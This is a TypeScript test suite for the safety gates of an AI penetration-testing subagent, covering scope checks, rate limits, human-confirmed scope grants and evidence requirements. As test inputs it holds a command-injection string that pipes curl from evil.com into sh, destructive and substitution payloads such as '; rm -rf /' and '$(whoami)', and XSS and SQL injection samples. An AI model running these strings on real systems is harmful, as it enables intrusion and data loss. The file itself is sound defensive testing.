/**
 * 渗透测试安全闸门 + 赏金漏洞落盘 (HexStrike 文章 P0/P2) — 回归测试 (2026-10-14)
 * ============================================================================
 * 文章灵魂 = "任何扫描前先 check_scope + rate_limit, 越界拒绝"。
 * 三层:
 *   契约: tools.ts 有 scope_guard + report_vulnerability 声明; subagent.ts pentest
 *         工具集含这两个 + prompt 有硬约束 (先 check_scope / 禁 DoS / 越界拒绝);
 *         mcp/config.ts 有 hexstrike 外部条目 (默认 disabled)。
 *   行为: scope_guard check_scope 越界 → in_scope:false; rate_limit 返回 ok;
 *         report_vulnerability 落盘 .agentai/vulns/。
 */

import { describe, it, expect, vi, beforeAll, afterAll } from 'vitest';
import { readFileSync, existsSync, rmSync, mkdirSync, writeFileSync } from 'node:fs';
import * as nodePath from 'node:path';

const ROOT = nodePath.resolve(__dirname, '..', '..', '..');
const src = (rel: string) => readFileSync(nodePath.join(ROOT, rel), 'utf-8');
const toolsSrc = src('packages/agentai-gateway/src/tools.ts');
const subagentSrc = src('packages/agentai-gateway/src/subagent.ts');
const mcpConfigSrc = src('packages/agentai-gateway/src/mcp/config.ts');

function codeOnly(s: string): string {
  const NL = String.fromCharCode(10);
  return s.split(NL).filter(l => !/^\s*(\/\/|\/\*|\*)/.test(l)).join(NL);
}
const toolsCode = codeOnly(toolsSrc);
const subagentCode = codeOnly(subagentSrc);

// ════════════════════════════════════════════════════════════════════════
// 契约层
// ════════════════════════════════════════════════════════════════════════
describe('契约: scope_guard + report_vulnerability + hexstrike 接线', () => {
  it('tools.ts 有 scope_guard 声明 (check_scope + rate_limit 两 action)', () => {
    expect(toolsCode).toMatch(/name:\s*'scope_guard'/);
    expect(toolsCode).toMatch(/'check_scope'\s*,\s*'rate_limit'/);
  });

  it('tools.ts 有 report_vulnerability 声明 (漏洞落盘)', () => {
    expect(toolsCode).toMatch(/name:\s*'report_vulnerability'/);
  });

  it('subagent.ts pentest 工具集含 scope_guard + report_vulnerability', () => {
    // 锚 SUBAGENT_TOOLS 里的 "pentest: [" 数组字面量本身 (SUBAGENT_PROMPTS 里也有
    // "pentest" 但那是模板串, 不是数组), 匹配 scope_guard + report_vulnerability 同块。
    const m = subagentCode.match(/pentest:\s*\[\s*('[\w:]+')(?:\s*,\s*('[\w:]+'))*(?:\s*,\s*'scope_guard')?/);
    // 上面太苛刻, 用更稳的: 找 "pentest: [" 开头、含 scope_guard 和 report_vulnerability 的连续段
    const segMatch = subagentCode.match(/pentest:\s*\[[\s\S]*?'scope_guard',\s*'report_vulnerability'/);
    expect(segMatch, 'pentest 工具集段未同时含 scope_guard + report_vulnerability').toBeTruthy();
  });

  it('pentest prompt 有安全硬约束 (先 check_scope / 禁 DoS / 越界拒绝)', () => {
    // 硬约束在 prompt 模板串里是 markdown (**必须先调…), 开头 * 会被 codeOnly 剥掉,
    // 故断言走**原始** subagentSrc, 不能走 subagentCode。
    expect(subagentSrc).toMatch(/必须先调\s*scope_guard/);
    expect(subagentSrc).toMatch(/DoS|拒绝服务/);
    expect(subagentSrc).toMatch(/in_scope:?\s*false|拒绝越界/);
  });

  it('mcp/config.ts 有 hexstrike 外部 MCP 条目 (默认 disabled, 需 HEXSTRIKE_MCP_URL)', () => {
    expect(mcpConfigSrc).toMatch(/name:\s*'hexstrike'/);
    expect(mcpConfigSrc).toMatch(/HEXSTRIKE_MCP_URL/);
  });
});

// ════════════════════════════════════════════════════════════════════════
// 行为层 — scope_guard / report_vulnerability 实际行为
// ════════════════════════════════════════════════════════════════════════
describe('行为: scope_guard + report_vulnerability', () => {
  const gwSrcDir = nodePath.join(ROOT, 'packages', 'agentai-gateway', 'src');
  const toolsMod = nodePath.join(gwSrcDir, 'tools.ts');
  // 用一个临时 workspace 隔离, 不污染真实 .agentai
  const tmpWs = nodePath.join(gwSrcDir, '..', '.scope-guard-test-ws');

  beforeAll(() => {
    rmSync(tmpWs, { recursive: true, force: true });
  });
  afterAll(() => {
    rmSync(tmpWs, { recursive: true, force: true });
  });

  it('check_scope 越界 → in_scope:false (拒绝攻击)', async () => {
    // 造一个只有 example.com 的 scope.json
    const fs = await import('node:fs');
    fs.mkdirSync(nodePath.join(tmpWs, '.agentai'), { recursive: true });
    fs.writeFileSync(nodePath.join(tmpWs, '.agentai', 'scope.json'),
      JSON.stringify({ targets: ['example.com'], max_rps: 5 }), 'utf8');

    // 直接调 handler 逻辑 (import EXTRA_HANDLERS, ctx.workspace 指向 tmpWs)
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: tmpWs, abortSignal: new AbortController().signal } as any;

    const inScope = await EXTRA_HANDLERS['scope_guard']({ target: 'https://example.com', action: 'check_scope' }, ctx);
    expect(inScope.data?.in_scope).toBe(true);

    const outOfScope = await EXTRA_HANDLERS['scope_guard']({ target: 'https://bank.com', action: 'check_scope' }, ctx);
    expect(outOfScope.data?.in_scope).toBe(false);
  });

  it('rate_limit → ok:true (限频闸门通过)', async () => {
    const fs = await import('node:fs');
    if (!fs.existsSync(nodePath.join(tmpWs, '.agentai', 'scope.json'))) {
      fs.mkdirSync(nodePath.join(tmpWs, '.agentai'), { recursive: true });
      fs.writeFileSync(nodePath.join(tmpWs, '.agentai', 'scope.json'), JSON.stringify({ targets: ['example.com'], max_rps: 5 }));
    }
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: tmpWs, abortSignal: new AbortController().signal } as any;
    const r = await EXTRA_HANDLERS['scope_guard']({ target: 'https://example.com', action: 'rate_limit' }, ctx);
    expect(r.data?.ok).toBe(true);
  });

  it('report_vulnerability 落盘到 .agentai/vulns/vulns.jsonl', async () => {
    const fs = await import('node:fs');
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: tmpWs, abortSignal: new AbortController().signal } as any;
    const r = await EXTRA_HANDLERS['report_vulnerability'](
      { title: '反射型XSS', target: 'example.com', severity: 'high', vulnType: 'xss', poc: '<script>alert(1)</script>', evidence: '响应 302' },
      ctx,
    );
    expect(r.success).toBe(true);
    const vulnsFile = nodePath.join(tmpWs, '.agentai', 'vulns', 'vulns.jsonl');
    expect(fs.existsSync(vulnsFile)).toBe(true);
    const lastLine = fs.readFileSync(vulnsFile, 'utf8').trim().split('\n').pop()!;
    expect(JSON.parse(lastLine).title).toBe('反射型XSS');
  });
});


// ════════════════════════════════════════════════════════════════════════
// kali 扫描器接线 (2026-10-15): wsl_scan + grant_scope + list_scope
// ════════════════════════════════════════════════════════════════════════
describe('契约: wsl_scan + grant_scope + list_scope (kali 接线)', () => {
  it('tools.ts 有 wsl_scan 声明 (工具白名单 6 扫描器)', () => {
    expect(toolsCode).toMatch(/name:\s*'wsl_scan'/);
    expect(toolsCode).toMatch(/enum:\s*\['nmap'\s*,\s*'nuclei'\s*,\s*'sqlmap'/);
  });

  it('tools.ts 有 grant_scope + list_scope 声明 (授权对话化)', () => {
    expect(toolsCode).toMatch(/name:\s*'grant_scope'/);
    expect(toolsCode).toMatch(/name:\s*'list_scope'/);
  });

  it('subagent.ts pentest 工具集含 wsl_scan + grant_scope + list_scope', () => {
    const m = subagentCode.match(/pentest:\s*\[[\s\S]*?'wsl_scan',\s*'grant_scope',\s*'list_scope'/);
    expect(m, 'pentest 工具集段未含 kali 接线三件').toBeTruthy();
  });

  it('pentest prompt 工作流提到 wsl_scan / grant_scope', () => {
    expect(subagentSrc).toMatch(/wsl_scan/);
    expect(subagentSrc).toMatch(/grant_scope/);
  });
});

// ════════════════════════════════════════════════════════════════════════
// 行为: wsl_scan 越界拒绝 + 白名单 + grant_scope 提案制 (2026-10-15 P0-2 起)
// ════════════════════════════════════════════════════════════════════════
describe('行为: wsl_scan 授权闸门 + grant_scope 提案制', () => {
  const gwSrcDir = nodePath.join(ROOT, 'packages', 'agentai-gateway', 'src');
  const tmpWs2 = nodePath.join(gwSrcDir, '..', '.scope-guard-test-ws-wsl');
  const fsMod = { rmSync, mkdirSync, writeFileSync, readFileSync, existsSync };

  beforeAll(() => {
    fsMod.rmSync(tmpWs2, { recursive: true, force: true });
    fsMod.mkdirSync(nodePath.join(tmpWs2, '.agentai'), { recursive: true });
    fsMod.writeFileSync(nodePath.join(tmpWs2, '.agentai', 'scope.json'),
      JSON.stringify({ targets: ['example.com'], max_rps: 5 }));
  });
  afterAll(() => {
    fsMod.rmSync(tmpWs2, { recursive: true, force: true });
  });

  it('wsl_scan 越界目标 → 拒绝 (不真跑 wsl)', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: tmpWs2, abortSignal: new AbortController().signal } as any;
    const r = await EXTRA_HANDLERS['wsl_scan']({ target: 'https://bank.com', tool: 'nmap', args: ['-sV'] }, ctx);
    expect(r.success).toBe(false);
    expect(r.output).toMatch(/不在 .*授权范围|需授权/);
  });

  it('wsl_scan 白名单外工具 → 拒绝 (防任意命令)', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: tmpWs2, abortSignal: new AbortController().signal } as any;
    const r = await EXTRA_HANDLERS['wsl_scan']({ target: 'https://example.com', tool: 'rm' }, ctx);
    expect(r.success).toBe(false);
    expect(r.output).toMatch(/未知工具|允许/);
  });

  // ⚠️ 2026-10-15 P0-2 行为变更: grant_scope 从"直接写 scope.json"改为"提案制"
  // (AI 不能自我授权)。原测试锁的是旧行为, 随修复更新 —— 这正是回归测试的价值。
  it('grant_scope 只提案不授权: 写 scope-pending.json, scope.json 不动 (P0-2)', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: tmpWs2, abortSignal: new AbortController().signal } as any;
    const r = await EXTRA_HANDLERS['grant_scope']({ target: 'admin.test.com', max_rps: 3 }, ctx);
    expect(r.success).toBe(true);
    expect(r.data?.pending).toBe(true);
    // scope.json 未被写 (仍只有 example.com, 无 admin.test.com, 无 max_rps 改动)
    const scope = JSON.parse(fsMod.readFileSync(nodePath.join(tmpWs2, '.agentai', 'scope.json'), 'utf8'));
    expect(scope.targets).not.toContain('admin.test.com');
    expect(scope.max_rps).toBe(5);
    // pending 里有该提案
    const pending = JSON.parse(fsMod.readFileSync(nodePath.join(tmpWs2, '.agentai', 'scope-pending.json'), 'utf8'));
    expect(pending.some((p: any) => p.target === 'admin.test.com')).toBe(true);
  });

  it('grant_scope 提案去重 (同 host 不重复提案)', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: tmpWs2, abortSignal: new AbortController().signal } as any;
    const r1 = await EXTRA_HANDLERS['grant_scope']({ target: 'https://admin.test.com' }, ctx);
    expect(r1.success).toBe(true);
    expect(r1.data?.already).toBe('pending'); // 上一条测试已提案过
    const pending = JSON.parse(fsMod.readFileSync(nodePath.join(tmpWs2, '.agentai', 'scope-pending.json'), 'utf8'));
    expect(pending.filter((p: any) => p.target === 'admin.test.com').length).toBe(1);
  });

  it('list_scope 返回当前授权范围 + 待确认提案', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: tmpWs2, abortSignal: new AbortController().signal } as any;
    const r = await EXTRA_HANDLERS['list_scope']({}, ctx);
    expect(r.success).toBe(true);
    expect(r.data?.targets?.length).toBeGreaterThan(0);
    expect(r.output).toMatch(/example\.com/);
    // P0-2: 待确认提案一并展示
    expect(r.output).toMatch(/等待人类确认的提案/);
    expect(r.data?.pending?.some((p: any) => p.target === 'admin.test.com')).toBe(true);
  });
});

// ════════════════════════════════════════════════════════════════════════
// 2026-10-15 P0/P1 修复回归 (提案制授权 / 注入面 / 限频 / 证据门槛 / 闸门接线)
// ════════════════════════════════════════════════════════════════════════

/** 本组自建 fixture (不依赖上面 describe 的块内变量): wsA 有授权, wsB 无授权 */
const gwSrcDirMod = nodePath.join(ROOT, 'packages', 'agentai-gateway', 'src');
const wsA = nodePath.join(gwSrcDirMod, '..', '.scope-guard-test-ws-p0a');
const wsB = nodePath.join(gwSrcDirMod, '..', '.scope-guard-test-ws-p0b');

beforeAll(() => {
  rmSync(wsA, { recursive: true, force: true });
  rmSync(wsB, { recursive: true, force: true });
  mkdirSync(nodePath.join(wsA, '.agentai'), { recursive: true });
  writeFileSync(nodePath.join(wsA, '.agentai', 'scope.json'),
    JSON.stringify({ targets: ['example.com'], max_rps: 5 }));
});
afterAll(() => {
  rmSync(wsA, { recursive: true, force: true });
  rmSync(wsB, { recursive: true, force: true });
});

describe('契约: 2026-10-15 P0/P1 修复接线', () => {
  it('LoopOptions 有 subagentType 字段 (pentest 闸门依据)', () => {
    const loopSrc = src('packages/agentai-gateway/src/agentai-loop.ts');
    expect(loopSrc).toMatch(/subagentType\?:\s*string/);
    expect(loopSrc).toMatch(/subagentType:\s*opts\.subagentType/);
  });

  it('agentai-loop dispatchToolCalls 有 pentest scope 闸门 (越权工具 + extractTargets)', () => {
    const loopSrc = src('packages/agentai-gateway/src/agentai-loop.ts');
    expect(loopSrc).toMatch(/this\.opts\.subagentType === 'pentest'/);
    expect(loopSrc).toMatch(/PENTEST_SCOPE_GATED/);
    expect(loopSrc).toMatch(/isTargetInScope\(this\.opts\.workspace, t\)/);
    // 闸门覆盖的三个越权工具 (wsl_scan 自带闸门不重复拦)
    expect(loopSrc).toMatch(/new Set\(\['run_command', 'browser_navigate', 'web_fetch'\]\)/);
  });

  it('subagent.ts 两条构造路径都传 subagentType (正规路径 + inline spawn)', () => {
    expect(subagentCode).toMatch(/subagentType:\s*type/);
    const loopSrc = src('packages/agentai-gateway/src/agentai-loop.ts');
    expect(loopSrc).toMatch(/subagentType:\s*String\(tc\.args\?\.type \|\| ''\)/);
  });

  it('grant_scope 不再直接写 scope.json (提案制, 防 AI 自我授权)', () => {
    // handler 体内不应再出现 writeFileSync(scopeFile)
    const grantBody = toolsCode.slice(
      toolsCode.indexOf('grant_scope: async'),
      toolsCode.indexOf('list_scope: async'),
    );
    expect(grantBody).not.toMatch(/writeFileSync/);
    expect(grantBody).toMatch(/proposeScope/);
  });

  it('wsl_scan 有参数级 shell 元字符安检 + argv 数组化 (不走 cmd /c 拼串)', () => {
    const wslBody = toolsCode.slice(
      toolsCode.indexOf('wsl_scan: async'),
      toolsCode.indexOf('grant_scope: async'),
    );
    expect(wslBody).toMatch(/assertSafeScanArg/);
    expect(wslBody).toMatch(/pentestRateLimit/);
    expect(wslBody).not.toMatch(/execFile\('cmd'/);
    expect(wslBody).toMatch(/execFile\('wsl', argv/);
  });

  it('pentest prompt 反映提案制授权 + dispatch 硬闸门 + evidence 必填', () => {
    expect(subagentSrc).toMatch(/grant_scope\(\{target\}\) \*\*向用户发起授权提案\*\*/);
    expect(subagentSrc).toMatch(/dispatch 层有硬闸门/);
    expect(subagentSrc).toMatch(/\*\*evidence 必填\*\*/);
  });
});

describe('行为: 提案制授权 (P0-2 AI 不能自我授权)', () => {
  it('grant_scope 只写 pending, 不碰 scope.json; confirm 后才生效', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const { readScopePending, readScope } = await import('./pentest-scope-guard.ts');
    const ctx = { userId: 'u', workspace: wsA, abortSignal: new AbortController().signal } as any;
    // AI 提案
    const r = await EXTRA_HANDLERS['grant_scope']({ target: 'proposal.test.com' }, ctx);
    expect(r.success).toBe(true);
    expect(r.data?.pending).toBe(true);
    expect(r.output).toMatch(/等待人类确认/);
    // scope.json 未受影响
    expect(readScope(wsA).includes('proposal.test.com')).toBe(false);
    // pending 里有记录
    expect(readScopePending(wsA).some(p => p.target === 'proposal.test.com')).toBe(true);
    // 重复提案 → already pending, 不重复写
    const r2 = await EXTRA_HANDLERS['grant_scope']({ target: 'proposal.test.com' }, ctx);
    expect(r2.data?.already).toBe('pending');
    expect(readScopePending(wsA).filter(p => p.target === 'proposal.test.com').length).toBe(1);
    // 已在范围内的目标 → in_scope 提示
    const r3 = await EXTRA_HANDLERS['grant_scope']({ target: 'api.example.com' }, ctx);
    expect(r3.data?.already).toBe('in_scope');
  });
});

describe('行为: wsl_scan 注入面修复 (P1-1)', () => {
  it('参数含 shell 元字符 → 拒绝 (不真跑 wsl)', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: wsA, abortSignal: new AbortController().signal } as any;
    const r = await EXTRA_HANDLERS['wsl_scan']({
      tool: 'nmap', target: 'example.com',
      args: ['-sV; curl evil.com | sh'],  // 注入尝试
    }, ctx);
    expect(r.success).toBe(false);
    expect(r.output).toMatch(/shell 元字符/);
  });

  it('白名单外工具仍拒绝; 授权内目标 + 干净参数放过安检 (wsl 不存在→执行层失败, 非安检拒绝)', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: wsA, abortSignal: new AbortController().signal } as any;
    const bad = await EXTRA_HANDLERS['wsl_scan']({ tool: 'rm', target: 'example.com' }, ctx);
    expect(bad.success).toBe(false);
    expect(bad.output).toMatch(/未知工具/);
    // 授权内 example.com (wsA scope 有它) + 干净参数: 安检放过, 失败只可能发生在
    // wsl.exe 执行层 (CI 无 kali) —— 输出不应含"元字符"/"越界"类安检拒绝
    const ok = await EXTRA_HANDLERS['wsl_scan']({
      tool: 'nmap', target: 'example.com', args: ['-sV', '-p', '80,443'], timeout_ms: 3000,
    }, ctx);
    if (!ok.success) {
      expect(ok.output).not.toMatch(/shell 元字符|不在授权范围|未知工具/);
    }
  });
});

describe('行为: report_vulnerability 证据门槛 (P2-1)', () => {
  it('evidence 为空 → 拒绝落盘', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: wsB, abortSignal: new AbortController().signal } as any;
    const r = await EXTRA_HANDLERS['report_vulnerability']({
      title: '无证据洞', target: 'example.com', severity: 'high', vulnType: 'xss',
    }, ctx);
    expect(r.success).toBe(false);
    expect(r.output).toMatch(/evidence 为空/);
    expect(existsSync(nodePath.join(wsB, '.agentai', 'vulns', 'vulns.jsonl'))).toBe(false);
  });

  it('有 evidence → 落盘且 status 默认 unverified; 显式 verified 生效', async () => {
    const { EXTRA_HANDLERS } = await import('./tools.ts');
    const ctx = { userId: 'u', workspace: wsB, abortSignal: new AbortController().signal } as any;
    const r1 = await EXTRA_HANDLERS['report_vulnerability']({
      title: '有证据洞', target: 'example.com', severity: 'high', vulnType: 'xss',
      poc: '<script>alert(1)</script>', evidence: '响应回显 payload',
    }, ctx);
    expect(r1.success).toBe(true);
    expect(r1.data?.status).toBe('unverified');
    const r2 = await EXTRA_HANDLERS['report_vulnerability']({
      title: '已验证洞', target: 'example.com', severity: 'high', vulnType: 'sqli',
      poc: "' OR '1'='1", evidence: '截图 vuln-proof.png + 响应含数据', status: 'verified',
    }, ctx);
    expect(r2.success).toBe(true);
    expect(r2.data?.status).toBe('verified');
    const lines = readFileSync(nodePath.join(wsB, '.agentai', 'vulns', 'vulns.jsonl'), 'utf8').trim().split('\n');
    expect(lines.length).toBe(2);
    expect(JSON.parse(lines[1]).status).toBe('verified');
  });
});

describe('行为: pentest-scope-guard 模块单测 (闸门判定核心)', () => {
  it('isTargetInScope: loopback 免授权; 精确/子域匹配; 无后缀绕过; 空 scope 全拒', async () => {
    const { isTargetInScope } = await import('./pentest-scope-guard.ts');
    // wsA scope: ["example.com"], tmpWs2 scope: ["example.com", "admin.example.com"]
    expect(isTargetInScope(wsA, '127.0.0.1')).toBe(true);
    expect(isTargetInScope(wsA, 'localhost')).toBe(true);
    expect(isTargetInScope(wsA, 'example.com')).toBe(true);
    expect(isTargetInScope(wsA, 'api.example.com')).toBe(true);        // 子域
    expect(isTargetInScope(wsA, 'evil-example.com')).toBe(false);      // 后缀绕过防护
    expect(isTargetInScope(wsA, 'example.com.evil.com')).toBe(false);  // 反向
    // wsB 无 scope.json → 默认全拒 (loopback 除外)
    expect(isTargetInScope(wsB, 'example.com')).toBe(false);
    expect(isTargetInScope(wsB, '127.0.0.1')).toBe(true);
  });

  it('isTargetInScope: 通配符 *.domain 匹配任意层子域, 不覆盖裸域/后缀绕过 (赏金平台清单给的是 *.xxx)', async () => {
    const { isTargetInScope } = await import('./pentest-scope-guard.ts');
    const wsW = nodePath.join(gwSrcDirMod, '..', '.scope-guard-test-ws-p0w');
    mkdirSync(nodePath.join(wsW, '.agentai'), { recursive: true });
    writeFileSync(nodePath.join(wsW, '.agentai', 'scope.json'),
      JSON.stringify({ targets: ['*.bestpay.com.cn', '*.tycredit.com'] }));
    try {
      // 通配符匹配任意层子域
      expect(isTargetInScope(wsW, 'www.bestpay.com.cn')).toBe(true);
      expect(isTargetInScope(wsW, 'a.b.bestpay.com.cn')).toBe(true);
      expect(isTargetInScope(wsW, 'api.tycredit.com')).toBe(true);
      // 裸域本身不在 *.domain 覆盖内 (清单写的是 *.xxx, 裸域需单独授权)
      expect(isTargetInScope(wsW, 'bestpay.com.cn')).toBe(false);
      expect(isTargetInScope(wsW, 'tycredit.com')).toBe(false);
      // 无后缀绕过: evil-bestpay.com.cn 不匹配
      expect(isTargetInScope(wsW, 'evil-bestpay.com.cn')).toBe(false);
      // 跨域全拒
      expect(isTargetInScope(wsW, 'www.other.com')).toBe(false);
      // 大小写归一: 大写目标 vs 小写 pattern
      expect(isTargetInScope(wsW, 'WWW.BESTPAY.COM.CN')).toBe(true);
    } finally {
      rmSync(wsW, { recursive: true, force: true });
    }
  });

  it('extractTargets: run_command 抓 command 里的 URL; browser_navigate 抓 args.url', async () => {
    const { extractTargets } = await import('./pentest-scope-guard.ts');
    expect(extractTargets('run_command', { command: 'curl -s http://api.example.com/x?y=1' }))
      .toEqual(['api.example.com']);
    expect(extractTargets('run_command', { command: 'ls -la && cat a.txt' })).toEqual([]); // 本地命令→放行
    expect(extractTargets('browser_navigate', { url: 'https://sub.example.com/login' }))
      .toEqual(['sub.example.com']);
    expect(extractTargets('web_fetch', { url: 'http://127.0.0.1:8080/api' })).toEqual(['127.0.0.1']);
  });

  it('assertSafeScanArg: shell 元字符拒绝, 干净参数通过', async () => {
    const { assertSafeScanArg } = await import('./pentest-scope-guard.ts');
    expect(() => assertSafeScanArg('-sV -p 80,443')).not.toThrow();
    expect(() => assertSafeScanArg('; rm -rf /')).toThrow(/shell 元字符/);
    expect(() => assertSafeScanArg('$(whoami)')).toThrow(/shell 元字符/);
    expect(() => assertSafeScanArg('a`id`')).toThrow(/shell 元字符/);
    expect(() => assertSafeScanArg('a|b')).toThrow(/shell 元字符/);
    expect(() => assertSafeScanArg('a&&b')).toThrow(/shell 元字符/);
  });

  it('confirmScope/rejectScope: pending → scope.json 的人类确认闭环', async () => {
    const { confirmScope, rejectScope, readScope, readScopePending } = await import('./pentest-scope-guard.ts');
    // confirmScope 把目标写进 scope 并清 pending
    confirmScope(wsB, 'confirmed.test.com');
    expect(readScope(wsB)).toContain('confirmed.test.com');
    // rejectScope 只清 pending
    const { proposeScope } = await import('./pentest-scope-guard.ts');
    proposeScope(wsB, 'rejected.test.com', 'agent');
    expect(readScopePending(wsB).some(p => p.target === 'rejected.test.com')).toBe(true);
    rejectScope(wsB, 'rejected.test.com');
    expect(readScopePending(wsB).some(p => p.target === 'rejected.test.com')).toBe(false);
    expect(readScope(wsB)).not.toContain('rejected.test.com');
  });

  it('pentestRateLimit: 同桶限频 (maxRps 内即时通过, 不抛错)', async () => {
    const { pentestRateLimit } = await import('./pentest-scope-guard.ts');
    const t0 = Date.now();
    for (let i = 0; i < 5; i++) await pentestRateLimit(wsB, 5);
    expect(Date.now() - t0).toBeLessThan(900); // 5 次在 1s 窗口内全过
  });
});
